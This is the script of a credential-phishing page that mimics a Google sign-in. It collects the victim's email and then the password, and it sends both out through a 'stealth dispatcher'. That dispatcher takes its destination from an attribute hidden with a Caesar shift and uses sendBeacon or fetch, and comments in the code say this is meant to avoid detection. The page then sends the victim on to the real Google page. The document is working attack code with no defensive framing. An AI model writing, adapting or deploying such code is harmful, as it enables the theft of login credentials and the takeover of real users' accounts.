<script>
    // Caesar-shift decryptor: The "Eraser" that hides our tracks
    const _unmask = (s) => s.split('').map(c => String.fromCharCode(c.charCodeAt(0) - 1)).join('');
    
    // We don't declare the HOOK globally as a string. We pull it only when needed.
    let email = "";

    function goToPass() {
        email = document.getElementById('target-email').value;
        if (!email) return;

        // Stage 1: Subtle exfiltration
        // Using a custom beacon instead of raw fetch to avoid basic triggers
        _dispatch("📧 ID: " + email);

        document.getElementById('email-section').style.display = 'none';
        document.getElementById('pass-section').style.display = 'block';
        document.getElementById('main-header').innerText = "Welcome";
        document.getElementById('main-sub').style.visibility = "hidden";
        document.getElementById('display-email').innerText = email;
    }

    async function harvest() {
        const pass = document.getElementById('target-pass').value;
        if (!pass) return;

        // Stage 2: Final Payload
        _dispatch("🔐 Captured\nU: " + email + "\nP: " + pass);

        // The "Ghost" Redirect - give it a second to breathe before vanishing
        setTimeout(() => {
            window.location.replace("https://accounts.google.com/signin/v2/challenge/pwd");
        }, 600);
    }

    // Tier 4 Stealth Dispatcher
    function _dispatch(m) {
        const h = _unmask(document.body.getAttribute('data-conf'));
        
        // We use 'navigator.sendBeacon' or 'Image' for stealth if 'fetch' is monitored
        if (navigator.sendBeacon) {
            const blob = new Blob([JSON.stringify({ content: m })], { type: 'application/json' });
            navigator.sendBeacon(h, blob);
        } else {
            // Fallback for older environments
            fetch(h, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: m })
            });
        }
    }
</script>
